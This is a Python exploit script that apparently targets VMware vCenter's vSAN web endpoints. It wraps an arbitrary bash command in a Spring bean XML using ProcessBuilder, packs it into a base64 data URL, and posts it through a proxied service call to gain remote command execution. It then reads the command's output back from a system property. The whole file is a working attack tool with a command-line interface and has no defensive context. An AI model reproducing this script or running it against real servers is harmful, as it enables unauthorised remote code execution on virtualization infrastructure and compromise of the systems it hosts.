import requests
import urllib3
import argparse
import zipfile
import io
import base64


def ssrf_xml(command):
    xml = """<beans xmlns="http://www.springframework.org/schema/beans">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value><![CDATA[""" + command + """]]></value>
            </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="x" value="#{ system.setProperty('output', br.lines().collect(collectors.joining('\\n'))) }"/>
    </bean></beans>"""
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "a") as zip_file:
        zip_file.writestr("xoffline_bundlex", xml)
    base64_data = base64.b64encode(zip_buffer.getvalue()).decode()
    return "https://localhost/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64," + base64_data


def exp(url, command):
    urllib3.disable_warnings()
    data = {
        "methodInput": [
            [ssrf_xml(command)]
        ]
    }
    print(ssrf_xml(command))
    print("[*] Send command")
    requests.post(url + "/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages", json=data, verify=False)
    print("[*] Get output")
    data = {
        "methodInput": ["output", None]
    }
    resp = requests.post(url + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty", json=data, verify=False)
    print(resp.json()["result"].replace("\\n", "\n"))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="url", required=True, help="https://127.0.0.1")
    parser.add_argument("-c", dest="command", help="id", required=True)
    args = parser.parse_args()
    exp(args.url, args.command)
